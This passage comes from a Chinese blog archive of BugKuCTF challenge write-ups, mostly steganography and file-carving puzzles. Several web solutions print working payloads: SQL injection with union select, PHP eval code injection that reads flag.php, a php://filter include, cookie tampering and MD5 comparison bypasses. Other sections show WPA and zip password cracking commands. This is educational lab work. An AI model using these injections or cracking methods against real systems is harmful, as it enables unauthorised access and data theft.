第十八关（点击一百万次）链接点进去是一个饼干，鼠标点击一次，就会计数一次 查看网页源代码，其中Javascript的部分有用到POST方法提交clicks的值 那么我们直接用Burpsuit提交clicks=10000000，就得到了flag 第十九关（备份是个好习惯）链接打开只看到一串MD5加密的字符串 查看源代码和用Burpsuit测试什么都没有发现 在想会不会有后台什么的，用御剑扫一下， 果然有东西 访问这个index.php.bak，下载下来一个文件，打开是php写的代码 首先简单了解一下strstr()、substr()、str_replace()函数，可以自己本地写个php代码测试一下，如下图 所以这个代码的意思呢，就是会将你POST或GET传入的参数，只提取？以后的内容，再将？去掉，并且将key关键字替换成空格，然后再传入 既然题目要求key1和key2的md5加密后的值一样，不加密的值要不一样 那我们就需要将key1和key2成功传入，这就需要绕过str_replace()函数，以为只替换了一次（只用了一str_replace()函数），那我们就可以用双写，如：kekeyy来绕过 而处理md5()函数有两种方法： 方法一： 因为md5()函数无法处理数组，所以返回的值是NULL，所以当key1和key2是数组，加密后就都是NULL，就相同，并且不加密的值不同，就可以成立 方法二： 如果md5()加密后的值是0eXXX形式的，那么就会被认为是科学计数法，那0eXXX代表的是0的XXX次方，无论多少都是0，加密后的数组也是相等的 这里给出一些md5加密后是以0e开头的字符串 QNKCDZO 240610708 s878926199a s155964671a s214587387a 现在额外谈一下为什么连接刚打开时会出现以下的md5值： d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e 特别突兀，出现在那个位置好像是我们可以用到的线索，但是其实没用到 有两段一样的，那么可以确定是我们看的index.php.bak源码里，返回的md5(key1)和md5(key2) 拿去在线网站破译一下是这样的 后来才知道也就是NULL的意思，为什么是NULL呢，因为key1和key2没有传入或者没有成功传入时，默认值就是NULL 如下图，没用成功传入key1和key2时，页面也是返回这个值，这样就解释通了 第二十关（成绩单）链接进去后有一个提交数值的框，对应输出学生的成绩 想到应该是SQL注入，尝试一下： 1&#39; and 1=2 # 没有返回数据 1&#39; and 1=1 # 数据正常返回 那么对数据的处理应该就是简单的单引号了 $_POST[&#39;value&#39;] 用order by测试一下，4的时候正常，到5的时候就出错了 那现在就可以利用union select了，直接拿到了数据库的名字 爆表名 爆fl4g表下的列名 爆skctf_flag列下的数据，顺利拿到flag 至此，11-20关的Write-up结束 后一部分链接：第21-30关Write-up","categories":[],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://knlvre.github.io/tags/CTF-Web/"}],"author":"Knlvre"},{"title":"BugKuCTF — 杂项题(第21-30关)","slug":"BugKuCTF—杂项题 第21-30关","date":"2019-03-06T16:00:00.000Z","updated":"2019-09-01T06:24:44.801Z","comments":true,"path":"2019/03/07/BugKuCTF—杂项题 第21-30关/","link":"","permalink":"https://knlvre.github.io/2019/03/07/BugKuCTF—杂项题 第21-30关/","excerpt":"","text":"前一部分链接：第11-20关Write-up第二一关（细心的大象）题目链接： https://share.weiyun.com/9287be0a629971ac53d97f39727eee18 下载下来一个名为1.jpg.zip的文件，解压下来一张叫做1.jpg的图片，看一下图片属性，看到了好像有用的一串文字 看起来有点像base64的加密，先解开后放着MSDS456ASD123zz 放到Kali里面，用binwalk看一下，确实藏着东西 提取出来看一下，是一个rar压缩文件，提取时，需要输入密码。把刚才base64解密出来的密码输入进去，就是它！ 分析rar压缩包解压出来的2.png图片，图片无法打开浏览，并且没得到什么有用信息 将这张图片放到Windows环境下是可以浏览的 用winhex打开，还是看到高度和宽度不一样，直接将高度修改成和宽度一样，再次浏览图片时，就看到了flag 第二十二关（爆照）题目链接： https://ctf.bugku.com/files/fa88c409b367aa9243313a85d138d183/8.jpg 下载下来一张jpg图片，用binwalk看一下， 有藏着东西 foremost分理处挺多张图片，但是都没有后缀名 首先看到88这张图片里面有二维码，扫一下看到bilibili 通过binwalk分析每一张图片，发现8888这张图片里面藏着东西，分离出来，也是一个二维码，扫一下出现panama 在Kali中没有其他信息后，转到Windows环境，查看每一张图片的属性 在888这个图片的属性中，发现了base64加密的字符串，解密后得到silisili 那么现在一共得到了3个不同的字符串，题目提示的flag格式是{XXXX_XXXX_XXXX} 我们在88得到的是bilibili，在888得到的是silisili，在8888得到的是panama，将他们按顺序拼起来，提交就是正确的flag 第二十三关（猫片安恒）题目链接： https://ctf.bugku.com/files/9f1bebac6b8282da716720cc99f35bed/png 下载下来一个叫做png的文件，通过winhex查看前缀（89 50 4E 47）知道这是一张png图片，加上后缀就可以看到图片 查看属性和放到Kali里面去binwalk看一下都没有什么信息 那么就重新回到Windows环境下，使用Stegsolve — DataExtract试着看能不能提取信息 由于题目提示”hint:LSB BGR NTFS”，那我们也就相应勾选选项，发现了一个新的好像是PNG的图片 为什么说好像是PNG呢，因为这个文件前缀多了FFFE。我们先把这个文件保存下来 然后用winhex打开，将这个多余的FFFE去掉，再加上.png的后缀试一下，出现了一半的二维码 修改一下图片的高度，就能看到整个完整的二维码 但是总感觉这个二维码哪里怪怪的，说不上来，对比了一下正常的二维码，发现是“黑白颠倒”了 放到Stegsolve里面，点一下下方的箭头，转换到Colour Inversion(颜色翻转)，就可以看到正常的二维码 拿到在线二维码解码网站去，扫出来的结果居然不是flag，是一个网站，还有事要做的 下载下来一个rar压缩文件，解压出txt文档，打开还是没有flag 用winhex打开rar压缩文件，除了之前解压下来的flag.txt外，发现还藏着东西（STM：flag.p。。。） 哇，再下去实在没有思路了。只能去百度，看其他大佬的writeup写着，需要用到工具ntfsstreamseditor 下载下来，以flag.txt为目标，果然提取出来了东西 提取出来的是一个.pyc后缀的文件，需要反编译才能看到内容 拿到在线的网站去反编译，果然可以，并且看到了代码内容 几个知识点的简单描述： ord()函数：转成ASCII码 chr()函数：转成ASCII码对应的文字 str()函数：转成字符串形式 .append()函数：在一个数组后面添加新的元素 ^运算符：是异或运算，若A ^ B = C，那么c ^ A(B) = B(A) 自己用Python写，将代码的过程逆转过来，相当于解密 ciphertext = [&#39;96&#39;,&#39;65&#39;,&#39;93&#39;,&#39;123&#39;,&#39;91&#39;,&#39;97&#39;,&#39;22&#39;,&#39;93&#39;,&#39;70&#39;,&#39;102&#39;,&#39;94&#39;,&#39;132&#39;, &#39;46&#39;,&#39;112&#39;,&#39;64&#39;,&#39;97&#39;,&#39;88&#39;,&#39;80&#39;,&#39;82&#39;,&#39;137&#39;,&#39;90&#39;,&#39;109&#39;,&#39;99&#39;,&#39;112&#39;] flag=&#39;&#39; ciphertext.reverse() for i in range(len(ciphertext)): if i % 2 == 0: s = int(ciphertext[i]) - 10 else: s = int(ciphertext[i]) + 10 s = chr(i ^ s) flag = flag + s print(flag) 注意这个ciphertext.reverse()，刚开始没有加这段代码，得出错误的结果 加完之后得到正确的flag 第二十四关（多彩）题目链接： https://ctf.bugku.com/files/9c1e769e2799f5b79ddadbdf49ac274b/lipstick.png 题目有些问题，而且实际意义并不大，就先不做了 flag{White_Album_is_Really_worth_watching_on_White_Valentine&#39;s_Day} 可以参考这篇文章： https://blog.csdn.net/x947955250/article/details/82805575 第二十五关（旋转跳跃）题目链接： https://ctf.bugku.com/files/5ca9828f72fd613ea0699d89074d642b/sycgeek-mp3_2.zip 下载下来一个压缩包，解压下来一个mp3文件，听一下是一段音乐 什么都没有发现，于是开始利用工具：MP3Stego对音频进行解码 先将音频复制一份到MP3Stego的目录下，执行以下命令进行解码： Decode.exe -X -P syclovergeek sycgeek-mp3.mp3 MP3Stego解码命令是： Decode.exe -X -P 密码 文件名 其中密码题目有给我们提示 查看提取出来的文件，里面直接写在flag 第二十六关（普通的二维码）题目链接： https://ctf.bugku.com/files/5e480ecb178711e82bc847a208e15b32/misc80.zip 下载下来一个压缩包，解压下来一个二维码 扫描一下显示”哈哈！就不告诉你flag就在这里”，然后什么都没有了 用winhex打开看一下， 在末尾发现了规则的字符串 没有看到字母，应该不是16进制。而且只有0-7的数字，猜测是8进制 用python进制转换，将整串字符串转换成十进制，然后把十进制转换成ASCII码 得到一串乱码 既然整串是错的，那么就三个三个转换，试一下 a = &#39;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&#39; flag = &#39;&#39; for i in range(0,len(a),3): flag = flag+chr(int(a[i:i+3],8)) print(flag) 拿下了flag 第二十七关（乌云邀请码）题目地址： https://ctf.bugku.com/files/69fed30501c47ddd56250587d359e7d9/misc50.zip 下载下来一个zip文件，解压后是一张png图片 查看属性和用winhex看什么都没有发现。用Stegsolve打开 — “Data Extract” — “Preview” 直接看到flag 记得将多余的空格删掉 第二十八关（神秘的文件）题目链接： https://ctf.bugku.com/files/d017f513e8f414cae61bfa3498ea34a8/5ee325f5-44c6-4a0b-b496-a0b11ef6dca1.rar 下载下来一个zip文件，另外解压出一个zip文件和一个png文件 尝试解压flag.zip却需要密码，浏览png图片没有提供信息 浏览flag.zip，发现里面也有logo.png 那我们就可以利用工具ARCHPR。先将logo.png压缩成password.zip 打开ARCHPR。加密文件选择flag.zip，攻击类型选择”明文”，明文文件路径选择password.zip 成功拿下密码 成功把logo.png和一个word文档解压下来。文档无法正常打开，我们用winhex打开看一下，在末尾发现flag.txt 在Kali中binwalk看一下，确实有东西 有分离出来一个zip文件，我们将它解压下来，可以看到flag.txt，查看一下发现是base64加密 解密这串bas64，拿到flag 第二十九关（论剑）题目链接： https://ctf.bugku.com/files/934db0621d88bd8b16049c1b795c6a1a/lunjian.jpg 图片平平无奇，属性内没有备注。winhex打开，中间发现一串二进制 8位为一个单位，用Python二进制转ascii看一下，内容是：mynameiskey!!!hhh，先放着 window上已经没有发现任何东西了，拿到Kali上，binwalk一下，发现有藏着东西，提取出来 图片浏览起来是一样的 对第二张图片尝试现在知道的各种方法，属性、binwalk、winhex、Stegsolve都没有结果 最后看别人WP，说要修改jpg图片的高度才能看到，我目前只会修改png的，惭愧，现在正好接触到学一下 网上各种文字提到修改JPG图片的高度和宽度都是说要找0xFFC0（SOFO，Start of Frame，帧图像开始）标示位，然后往后第4字节开始，前2个字节是图片高度，后2个字节是图片宽度 我对lunjian.jpg尝试了一下，确实有找到0xFFCO关键字，但是确在整个图片内容的后半部分。尝试从第3个字节开始修改，发现图片纹丝不动，我还多次重新打开winhex，重新打开图片，但就是没用。后来又去找了将近20篇讲解JPG图片的文章，关于图片的高度描述都是说0xFFC0后第四位开始，我还去网上下载了JPG图片，按照方法去修改，这次的确将高度修改成功了，但是对lunjian.jpg就是修改不了，有点崩溃。 最后的最后，去百度JPG图片分析的软件，抱着尝试的心态下载了一个叫JPEGsnoop的软件，打开lunjian.jpg。曙光终于来了，我在分析出来的结果中看到了关于高度和宽度的信息，并且是在一个叫SOF2的块里。这个块以FFC2开头（其实换成FFC0就是大部分文章说的，神秘的SOFO，Start of Frame块），里面有高度和宽度的信息 那就按照这个去winhex里找FFC2（Ctrl + Alt + X找Hex Values），成功找到，并且在内容的较前位置，应该是真的了 从0xFFC2开始，对比JPEGsnoop的值，16进制转化过来是相等的，怀着激动的心情尝试着将00 42改成00 EE 保存完，查看图片，成功了。也算是一波三折，成功后老泪纵横 给出的数字打上了马赛克，题目并没有解决 继续分析，发现之前我们获取01二进制的那个位置后面，有可疑十六进制： BC AF 27 1C 而7z的文件头是： 37 7A BC AF 27 1C 将其修复 再次将这张图片拿去binwalk分析，发现果然有了新东西 分离时，使用foremost好像分离不出来这个7z文件，所以改成使用dd来分离 提取时需要输入密码，想到此题最开始获得的暂时放着的字符串mynameiskey!!!hhh 果然可以提取成功，查看一下提取出来的ljc2.jpg图片，还是一样，可能还是需要修改高度 再次拿到winhex下，修改高度，得到另一串打码的字 和上一张打码的对比组合起来就是： 666C61677B6D795F6E616D655F482121487D 发现是base16，用Python解码一下，得到了flag 第三十关（图穷匕现）题目链接： https://ctf.bugku.com/files/f6697e1f904a0c30b56f72fcf0023434/paintpaintpaint.jpg 有备注信息，先放着 用winhex打开，发现在JPG图片结束标识（FFD9）之后，有很纪律的数字 复制粘贴到Notepad++里面，使用插件Hex转换成ASCII 发现是一列一列的坐标 将括号和逗号全部去掉 放到Kali下，使用gunplot工具，画图 画出一个二维码 扫描二维码得到flag 至此，21-30关的Write-up结束后一部分链接：第31-40关Write-up","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"BugKuCTF — Web题(第1-10关)","slug":"BugKuCTF—Web题 第1-10关","date":"2019-03-05T16:00:00.000Z","updated":"2019-09-01T13:16:41.883Z","comments":true,"path":"2019/03/06/BugKuCTF—Web题 第1-10关/","link":"","permalink":"https://knlvre.github.io/2019/03/06/BugKuCTF—Web题 第1-10关/","excerpt":"","text":"第一关（web2）打开链接后是一堆迎面飞来的“滑稽”表情 查看网页源代码后就能发现flag 第二关（计算器）尝试输入，却发现只能输入1位数，但是答案明显不止一位数 查看源代码，将其中的maxlength修改成3（原本是1） 再输入正确答案，就得到了flag 第三关（Web基础$_GET）进入链接后直接看到信息 根据信息直接输入url得到flag ?what=flag 第四关（Web基础$_POST）同第三关，进入链接后直接看到信息 不同的是，这次要用POST方式。在挂上Burpsuit代理之后，刷新网页就会拦截到请求，发送what参数得到flag 第五关（矛盾）进入连接后直接看到信息 为什么题目叫矛盾了，因为要求num即不是数字的同时，却要等于1。这是就想到了科学记数法 1e = 1E = 1*10的0次方 2e1 = 2E1 = 2*10的1次方 3e2 = 3E2 = 3*10的2次方 以此类推....... 那么我们就能这样提交参数，顺利拿到flag ?num=1e 第六关（web3）链接进去后就不断弹出窗口”flag就在这里”，”快来找找吧” 谷歌浏览器在多次点击后，弹窗就会消失；火狐浏览器可以直接禁止弹窗跳出。没有弹窗后，直接查看源代码 在源代码的最后，发现了一串unicode编码 拿去在线网站转成ASCII一下就得到了flag 第七关（域名解析）题目提示： 那么我们就直接按照他的要求修改hosts文件，hosts文件Windows下的路径： C:\\Windows\\System32\\drivers\\etc\\hosts 将这条记录添加在下面（注意不要加#号） 然后用浏览器访问flag.baidu.com就可以拿到flag了 第八关（你必须让他停下）链接打开是一个一直刷新跳动的网页，提示我们如果能让它停下来就能拿到flag 我们用Burpsuit抓包，用Repeater一直去发包。每go一次，网页最下面都会返回不同的数字.jpg 当刷到10.jpg时，flag就跑出来了 第九关（本地包含）链接进去可以看到代码 首先明确几个知识点： $_REQUEST 的意思是获得参数，不论是@$_GET还是@$_POST可以得到的参数@$_REQUEST都能得到 eval() 函数存在命令执行漏洞，构造出文件包含会把字符串参数当做代码来执行 file() 函数把整个文件读入一个数组中，并将文件作为一个数组返回 include()函数和php://input，php://filter结合很好用，php://filter可以用与读取文件源代码，结果是源代码base64编码后的结果 php://filter/convert.base64-encode/resource=文件路径（如index.php） 方法一： 把原本的var_dump()函数的括号构造掉，让eval()函数转去执行show_source(‘flag.php’) http://123.206.87.240:8003/?hello=1);show_source(%27flag.php%27);var_dump(1 网页直接返回flag.php的内容，里面就有flag 方法二： 同样用一个右括号把原本的var_dump()函数闭合掉，然后转去执行include $_POST[‘a’]，后面直接用双斜杠注释掉后面的内容，也可以像方法一那样，随便加一个var_dump(1 然后POST提交a的值如下 http://120.24.86.145:8003/index.php?hello=1);include $_POST[&#39;a&#39;];// POST值：a=php://filter/convert.base64-encode/resource=flag.php 得到一串base64密码，拿去解密一下，就可以看到flag 方法三： 直接将flag.php文件读入变量hello中 ?hello=file(&#39;flag.php&#39;) 第十关（变量1）链接进入后可以看到代码 这个代码大概意思就是，需要通过GET方式提交参数args，并且args的内容只能是【0-9a-zA-Z】，才能执行eval()函数，否则提醒你args error! 知识点一：可变变量 知识点二：$GLOBALS[] $GLOBALS [一个包含了全部变量的全局组合数组] 既然只能传入数字、大小写字母，那我们就传入GLOBALS，让var_dump()打印出这个数组的内容 就可以看到其中一个全局变量，存储着flag 至此，1-10关的Write-up结束 后一部分链接：第11-20关Write-up","categories":[],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://knlvre.github.io/tags/CTF-Web/"}],"author":"Knlvre"},{"title":"BugKuCTF — 杂项题(第11-20关)","slug":"BugKuCTF—杂项题 第11-20关","date":"2019-03-03T16:00:00.000Z","updated":"2019-09-01T06:24:55.044Z","comments":true,"path":"2019/03/04/BugKuCTF—杂项题 第11-20关/","link":"","permalink":"https://knlvre.github.io/2019/03/04/BugKuCTF—杂项题 第11-20关/","excerpt":"","text":"前一部分链接：第1-10关Write-up第十一关（多种方法解决）题目链接： http://123.206.87.240:8002/misc/3.zip 下载下来一个zip文件，解压开是一个KEY.exe文件 用UE打开看一下，开头就发现是imgbase64（图片转换成base64进行存储） 然后百度找在线的base64转换图片网站，得出一个二维码，扫描得到flag 转换网站可以用一下这个：base64转换图片 第十二关（闪得好快啊）题目链接： https://ctf.bugku.com/files/6dcac03199e58749725cbcd9cc958a9b/masterGO.gif 链接进去是一张一直闪动的二维码，我们把它下载下来 这里想到之前CTF比赛用到的一个图片分析神器StegSolve，用这个工具打开这张GIF图片 然后点击Analysis-&gt;Frame Browser，翻译过来就是帧浏览 打开后，新窗口上方写着1 of 18，那就是有18张图片 然后就是一张一张扫描，一张就是一个字母，拼起来就是flag： SYC{F1aSh_so_f4sT} 第十三关（come_game）题目链接： https://ctf.bugku.com/files/1c617f3d9fc3d909766e813ec28ca8c6/game_1.zip 下载下来一个zip文件，解压后拿到一个exe文件，好像是个游戏，点开看看 有3个地方可以存档，每次玩完游戏都会帮你存档，对应生成save1,2,3三个文件 还有一个叫做DeathTime的文件，用UE打开发现里面的数字刚好是我死亡的次数，并且每次死亡都会更改 试着自己更改一下，结果进入游戏的死亡次数就是你自己更改的次数 由此可以知道游戏配置文件是可以自己更改的，并且影响着游戏 那我们就打开save1，现更改一下第一个参数试一下（1-&gt;2）。发现报错了，那这个1应该不能动它 试着更改一下第2个参数（32-&gt;33），进入游戏后发现地图变了，猜测这个参数能改变挑战哪一关 多次尝试，将32改成35后直接通过，顺利拿下了flag 但是提交这个flag的时候，提示我错误 flag{6E23F259D98DF153} 应该不会再藏什么东西了，看题目提示也没有说格式。但是题目和上一题一样，提示着来源于第七季极客大挑战 而上一题的flag格式是SYC{}，试一下，果然正确了 SYC{6E23F259D98DF153} 第十四关（白哥的格子）题目链接： https://ctf.bugku.com/files/57c79d5b04e18a4bf8995d2721d76d5c/jpg 下载下来一个叫jpg的文件，用binwalk看一下没有发现什么东西。file命令看一下，属于jpeg类型的图片，存储了exif信息 在windows环境下看一下文件的属性，也没有任何的信息提示 用winhex打开（这里不再用UE是因为，UE打开这张图片时会部分字符没显示出来，并且以后要收费） 在末尾看到一个好像有点熟悉的字符串 应该是一个栅栏密码，自己python写一下破解的代码 在结果中，看到了比较符合flag格式的字符串 但是复制粘贴过去提交时，提示错误。后来将大括号外面的2个@@去掉，再次提交就正确了 栅栏密码的在线解密和与之相关的介绍都可以到这个网站去：在线破解栅栏密码 第十五关（Linux）题目链接： http://123.206.87.240:8002/misc/1.tar.gz 下载下来一个名为1.tar.gz的压缩文件，解压后得到一个名为flag的文件 使用cat命令查看文件，直接在文件的最后面得到了flag 第十六关（隐写3）题目链接： https://ctf.bugku.com/files/642a45bae2ceb406812acdd5ec327ce9/58d54bd3e134e.zip 下载下来一个zip文件，解压得到一个png图片 用winhex打开看一下，就前16个字节来看，确实是PNG图片 在图片没做任何修改前，打开浏览是这样的 很明显图片的长度和宽度不一样，在第三关的时候就碰到过这种类型的题目 我们将高度改成和宽度一样试一下 再次查看图片，就看到了flag了 第十七关（做个游戏）题目链接： https://ctf.bugku.com/files/465585c655e201384823f64342cfd554/heiheihei.jar 下载下来一个.jar的JAVA文件，打开看一下，是一个游戏。需要坚持60秒才能拿到flag，显然我们是不可能去玩的 因为是JAVA游戏，想到反编译，于是就去网上下载了这款叫做JAVA Decompiler的JAVA发编译软件 用这个软件打开游戏，在PlaneGameFram.class里面找到了flag 可是输入flag的时候提示错误，那应该是还是要解开中间的那个base64加密。解密后再次提交就成功了 第十八关（想蹭网先解开密码）题目链接： https://ctf.bugku.com/files/77decd384a172b9a2294e6c6acfd48cc/wifi.cap 下载下来一个.cap文件，可以用wireshark打开 WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下 题目提示密码是以1391040开头的手机号，我们用Kali上的工具crunch生成一个暴力破解的字典 crunch 11 11 -t 1391040%%%% &gt;&gt;&gt; wifipassword.txt 字典生成后，我们就可以用aircrack-ng命令来对这个包进行暴力破解 aircrack-ng -w wifipassword.txt wifi.cap 输入命令后，会提示你选择Index number，这里我们输入3 然后就可以破解成功，拿到了flag 第十九关（Linux2）题目链接： http://pan.baidu.com/s/1skJ6t7R //密码：s7jy 刚开始在Linux环境下打开链接，下载下来一个叫1skJ6t7R的html文件，研究了半天没发现什么 后来在Windows环境下重新打开，才发现是百度云盘链接T T。下载下来一个叫brave.zip文件，拉到Linux虚拟机中 解压出一个名叫brave的文件，没有任何的后缀，binwalk看一下，有藏着东西 用foremost分离出文件 在output-jpg下面有一张图片，打开看一下写着flag，尝试一下发现不对 用binwalk再看一下这张图片，什么都没有 将图片放到Windows环境下，用winhex看一下什么都没发现，属性里面什么也都没有发现，这个图片可能是骗人的 那好吧，再回到Linux，用cat命令看一下最初的brave文件，提示匹配到二进制文件 是二进制文件，就可以用strings命令看一下。加上grep筛选KEY关键字，就找到了flag 关于Strings命令： strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用 可以参考这篇简单的文章：https://blog.csdn.net/qq_42357070/article/details/83055257 第二十关（账号被盗了）题目链接： http://123.206.87.240:9001/ 打开链接是一个网页，点击”get flag”按钮后，显示”You are not admin” 但是我们在url中看到cookieflag.php，打开Bursuit，刷新网页，拦截到POST请求 将其中的isadmin=false，改成isadmin=true。得到的回复是一个链接 但是这个链接我始终访问不了，感觉是BUGKU服务器出问题了？下次再试试，只能先放着了 至此，11-20关的Write-up结束后一部分链接：第21-30关Write-up","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"BugKuCTF — 利用Kali分离图片中的隐藏文件","slug":"BugKuCTF—利用Kali分离图片中的隐藏文件","date":"2019-02-25T16:00:00.000Z","updated":"2019-09-01T06:25:14.309Z","comments":true,"path":"2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/","link":"","permalink":"https://knlvre.github.io/2019/02/26/BugKuCTF—利用Kali分离图片中的隐藏文件/","excerpt":"","text":"在刚开始做CTF的杂项习题时，碰到有些图片会藏着文件 而这时就需要把图片给提取出来，看到很多题解用到了KALI里面的工具：Binwalk、dd、foremost，于是便去了解 例题：可以借用BUGKU中的这道题，题目地址： https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip 一、BinwalkBinwalk会分析一张指定的图片 binwalk ada.jpg 像这张图片，发现隐藏着flag.txt Binwalk也可以做提取工作，加一个 -e 参数就可以了 不过也会出差错，最好和foremost、dd结合起来提取更完整的内容 binwalk -e ada.jpg 二、foremostforemost工具是用来分离出图片中隐藏的文件，举上面的栗子 我们用binwalk确定ada.jpg图片中有隐藏文件后，就可以进行分离 它会在当前目录下生成一个output文件夹，分离出来的文件放在里面 foremost ada.jpg 三、dddd工具也是用来分离的 dd if=ada.jpg of=ada.zip skip=218773 bs=1 if：要提取分离的文件 of：输出的文件 skip：跳转到第218773块后再提取，这个参数可以看binwalk分析出来的数据而决定 bs：设置每次读写块的大小为1个字节 这篇文章只做简单的介绍 如果想要详细具体的命令，每个人需求都不同，根据具体需要，自己去搜索","categories":[],"tags":[{"name":"CTF-Misc","slug":"CTF-Misc","permalink":"https://knlvre.github.io/tags/CTF-Misc/"}],"author":"Knlvre"},{"title":"BugKuCTF — 杂项题(第1-10关)","slug":"BugKuCTF—杂项题 第1-10关","date":"2019-02-25T16:00:00.000Z","updated":"2019-09-01T06:25:22.835Z","comments":true,"path":"2019/02/26/BugKuCTF—杂项题 第1-10关/","link":"","permalink":"https://knlvre.github.io/2019/02/26/BugKuCTF—杂项题 第1-10关/","excerpt":"","text":"第一关（签到题）关注公众号扫描二维码就能获得flag 第二关（这是一张单纯的图片）题目链接： http://123.206.87.240:8002/misc/1.jpg 打开链接发现是一张jpg图片 看了一下图片属性，没发现什么东西 使用UE（UltraEdit）打开图片看看。发现在最后几行有着Unicode编码 复制这个Unicode编码，通过在线工具转换成ASCII编码后，Flag就出来了 第三关（隐写）题目链接： https://ctf.bugku.com/files/f8da9b5979e89e91d083c7accdea4427/2.rar 下载下来是一个rar文件，里面有一张png图片 首先，还是先看一下图片的属性，没发现什么东西 使用UE打开，旁边也没有发现可疑的编码。怀疑图片的高度或宽度被更改了，看一下果然如此 这里说一下关于使用UE打开图片后，十六进制内容的含义： PNG图片固定格式： 89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 （固定）：8个字节（0-7），89 50 4E 47 0D 0A 1A 0A为png的文件头 （固定）：4个字节（8-b），00 00 00 0D（即为十进制的13）代表数据块的长度为13 （固定）：4个字节（c-f），49 48 44 52（即为ASCII码的IHDR）,文件头数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。文件头数据块由13字节组成， （可变）：13个字节（0-c），这13个字节既文件头数据块。1.前4个字节代表该图片的宽；2.后4个字节代表该图片的高；3.后5个字节依次为：Bit depth、ColorType、Compression method、Filter method、Interlace method （可变）：剩余三字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行CRC计算得到 修改一下图片的高度，改成和宽度一样，就可以看到flag了 第四关（telnet）题目链接： http://123.206.87.240:8002/misc/telnet/1.zip 下载下来一个.pcap类型的文件，是抓包的数据，可以用wireshark打开 打开后，只看到一个TCP流，我们直接追踪，就可以看到flag了 不过这题直接用UE打开，也可以看到flag 第五关（眼见非实ISCCCTF）题目链接： https://ctf.bugku.com/files/919ee4ea1658c3e3ef8b59b67f298470/zip 下载下来的是一个名字叫zip的文件，什么后缀都没有，我们先用UE打开 看到前四个字节是这样的，那么这是一个ZIP压缩文件 ZIP压缩文件固定格式： 50 4B 03 04 既然是ZIP压缩文件，就给它加上.zip后缀，然后解压下来 解压下来发现是一个.docx文件，再次用UE打开，发现前缀还是50 4B 03 04，这还是一个ZIP压缩文件 老样子，把后缀改正.zip，解压下来 这次解压下来一个文件夹，用记事本打开里面 “word-document.xml” 文件，搜索flag就找到了答案 第六关（啊哒）这道题我自己开始接触KALI的binwalk、dd、foremost工具方法一：题目链接： https://ctf.bugku.com/files/37b57dc545752a92fa6b2d571b88667a/1cdf3a75-21ed-4b91-8d49-1b348d44dcf.zip 下载下来是一个zip压缩文件，解压出一张jpg图片 第一步还是先看一下属性。注意到属性中有一串突然出现的十六进制数字，不知道干嘛用的，先放着 先用UE打开。搜索看到关于flag的线索：flag.txt 注意：利用UE搜索时，记得勾选”查找ASCII”选项 既然有隐藏文件，放到KALI里面用dd或foremost进行分离 在分离出来的文件夹里，发现一个zip压缩文件，里面有flag.txt，尝试解压却要密码 这是我们想到之前在属性看到的那串十六进制数字。将其转换成字符串 将转换后的字符串输入，果然是密码 方法二：套路，先用binwalk看一下 利用dd或者foremost提取出其中的隐藏文件 剩下的步骤和方法一中的一样了 第七关（又是一张图片，还单纯吗）题目链接： http://123.206.87.240:8002/misc/2.jpg 链接打开是一张图片，这次这道题目直接在KALI上把它下载下来 wget http://123.206.87.240:8002/misc/2.jpg 老套路，还是用Binwalk看一下里面有没有藏东西。果然有 binwalk 2.jpg 用foremost进行分离，分离出来的东西放在output文件夹内 foremost 2.jpg 打开output文件夹内的JPG文件夹，里面静静躺着2张图片，直接尝试了一下第2张图片里的flag，就成功了 第八关（猜）题目链接： http://123.206.87.240:8002/misc/cai/QQ20170221-132626.png 下载下来一张图片 老规矩还是用Binwalk看一下。可是没有发现有用信息，根据这道题目名字”猜”，所以应该不是考察隐写 后来发现百度有个功能叫做“百度识图” 识别一下这张图片，结果提示的是“刘亦菲”。那么根据题目说的，flag是某人的名字全拼 试了一下key{liuyifei}，结果竟然真的是。这道题告诉我们，要善于利（给）用（百）搜（度）索（打）工（广）具（告） 第九关（宽带信息泄露）题目链接： https://ctf.bugku.com/files/5986768ca8b96cead45aec16a88431b5/conf.bin 下载下来一个后缀名是.bin的文件，一般这种文件是二进制文件，先用记事本和UE打开都没有任何的发现，是一堆乱码 后来发现一个叫做RouterPassView的软件，可以用来查看bin文件。下载下来试了一下，果然可以打开并且正常显示 因为题目提示：flag{宽带用户名}，所以直接ctrl+f搜索”username”，直接找到flag 第十关（隐写2）题目链接： https://ctf.bugku.com/files/af49803469dfdabb80acf562f9381335/Welcome_.jpg 下载下来一张jpg格式图片，在Windows下查看属性没发现什么东西 UE打开后，发现里面藏着flag.rar（题目写着隐写，其实可以直接binwalk，如果没有骗人的话） 赶紧放到Kali里面去用binwalk看一下，果然有藏东西 赶紧用foremost分离，分离出来一个zip文件夹，里面有一个zip文件，解压出2个文件 先看一下提示.jpg，只知道是QJK，其他什么都没看出来（黑人问号？？？） 先提取flag.rar看看猜密码，发现这不是rar文件，而是zip文件 修改后缀名为.zip，然后直接使用fcrackzip工具暴力破解出密码是871 -b：代表brute-force，暴力破解；-l：表示密码长度（3-3就是3了）；-c：指定字符集合（看下面第2张图片） 可以看一下这篇简单的文章：fcrackzip简单讲解 后来自己想想这个871是怎么来的？看下图吧，脑洞大开 输入密码后解压出来一张图片3.jpg 在Windows环境下查看属性没有收获 用UE打开。刚开始搜索flag关键字，没有找到，但是还好谨慎用眼睛找了一下，发现了f1@g字样，难怪没有找到，社会凶险，城市套路多，学到了 复制了去提交发现不对，然后看到括号里面是base64的编码，想把它解码一下再放进去提交，结果就可以了 